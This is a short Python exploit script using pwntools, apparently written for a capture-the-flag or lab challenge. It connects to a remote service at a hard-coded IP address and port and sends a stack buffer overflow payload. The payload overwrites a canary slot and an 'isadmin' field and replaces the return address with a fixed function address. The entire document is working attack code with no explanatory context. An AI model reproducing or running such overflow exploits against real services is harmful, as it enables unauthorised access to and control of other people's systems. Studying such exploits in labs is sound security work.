#!/bin/env python3
import sys
from pwn import *

conn = remote('170.64.222.246', 1340)
conn.recvline()
buffer = b"AAAABBBBCCCCDDDD"
canary = b"EEEE"
isadmin = b"FFFF"
extra = b"GG"
# final = b"\xF6\x91\x04\x08"
# final = b"\x08\x04\x91\xF6"
final = p32(0x080491f6)
endl = b"\x0A"

s = buffer + canary + isadmin + extra + final + endl
# print()
conn.send(s)
print(conn.recvall(3))

conn.close()